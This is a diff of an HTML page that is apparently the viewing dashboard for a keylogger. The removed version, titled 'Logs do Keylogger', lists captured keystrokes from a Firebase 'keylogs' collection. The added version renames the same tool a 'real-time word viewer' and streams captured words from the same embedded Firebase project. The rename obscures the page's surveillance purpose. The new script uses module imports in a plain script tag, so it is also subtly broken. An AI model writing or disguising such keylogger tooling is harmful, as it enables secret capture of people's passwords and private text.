@@ -1,52 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Logs do Keylogger</title>
-  <!-- Adicione as tags do Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visualizador de Palavras em Tempo Real</title>
+
+    <style>
+        body {
+            background-color: black;
+            font-family: monospace;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .quadro {
+            background-color: white;
+            border: 2px solid #ccc;
+            border-radius: 10px;
+            padding: 20px;
+            width: 80%;
+            max-width: 800px;
+            overflow-y: auto; /* Permite rolagem quando necessário */
+            white-space: pre-wrap; /* Quebra linhas automaticamente */
+        }
+
+        .palavra-nova {
+            background-color: #f0f0f0;
+            padding: 5px;
+            margin-bottom: 5px;
+        }
+    </style>
 </head>
 <body>
-  <h1>Logs do Keylogger</h1>
-  <div id="logs"></div>
+    <div class="quadro">
+        <h1>Visualizador de Palavras em Tempo Real</h1>
+        <p id="palavras"></p>
+    </div>
 
-  <!-- Configuração do Firebase -->
-  <script>
-    // Substitua os valores pelos de sua configuração do Firebase
-    const firebaseConfig = {
-  apiKey: "AIzaSyD97RPWRXb1ctksvWSvzm3NZ0earAn7Mcc",
-  authDomain: "visualizado-realtime.firebaseapp.com",
-  databaseURL: "https://visualizado-realtime-default-rtdb.firebaseio.com",
-  projectId: "visualizado-realtime",
-  storageBucket: "visualizado-realtime.appspot.com",
-  messagingSenderId: "279838352172",
-  appId: "1:279838352172:web:1f948ee868297e229d8289"
-};
+    <script>
+        // Importar bibliotecas do Firebase
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, onChildAdded } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
-    // Inicializar o Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+        // Configuração do Firebase (substitua com suas credenciais)
+        const firebaseConfig = {
+            apiKey: "AIzaSyD97RPWRXb1ctksvWSvzm3NZ0earAn7Mcc",
+            authDomain: "visualizado-realtime.firebaseapp.com",
+            databaseURL: "https://visualizado-realtime-default-rtdb.firebaseio.com",
+            projectId: "visualizado-realtime",
+            storageBucket: "visualizado-realtime.appspot.com",
+            messagingSenderId: "279838352172",
+            appId: "1:279838352172:web:1f948ee868297e229d8289"
+        };
 
-    // Função para obter e exibir os logs
-    function getLogs() {
-      db.collection("keylogs").orderBy("timestamp").get().then((querySnapshot) => {
-        const logsDiv = document.getElementById("logs");
-        logsDiv.innerHTML = ""; // Limpar conteúdo anterior
-        querySnapshot.forEach((doc) => {
-          const log = doc.data();
-          const logElement = document.createElement("div");
-          logElement.textContent = `${log.timestamp}: ${log.key}`;
-          logsDiv.appendChild(logElement);
+        // Inicializar Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        // Referência para o nó do banco de dados onde as palavras são armazenadas
+        const palavrasRef = ref(db, 'palavras');
+
+        // Elemento HTML que exibirá as palavras
+        const palavrasElement = document.getElementById('palavras');
+
+        // Função para adicionar uma nova palavra ao quadro
+        function adicionarPalavra(palavra) {
+            const textoAtual = palavrasElement.textContent;
+            const ultimaPalavra = textoAtual.slice(-1); // Pega a última palavra
+
+            // Se a última palavra não for um ponto final, adiciona um espaço
+            if (ultimaPalavra !== '.') {
+                palavra = ` ${palavra}`;
+            }
+
+            palavrasElement.textContent += palavra;
+        }
+
+        // Ouvinte para novas palavras adicionadas ao banco de dados
+        onChildAdded(palavrasRef, (snapshot) => {
+            const palavra = snapshot.val();
+            adicionarPalavra(palavra);
         });
-      }).catch((error) => {
-        console.error("Erro ao obter logs: ", error);
-      });
-    }
-
-    // Chamar a função para obter logs ao carregar a página
-    window.onload = getLogs;
-  </script>
+    </script>
 </body>
 </html>
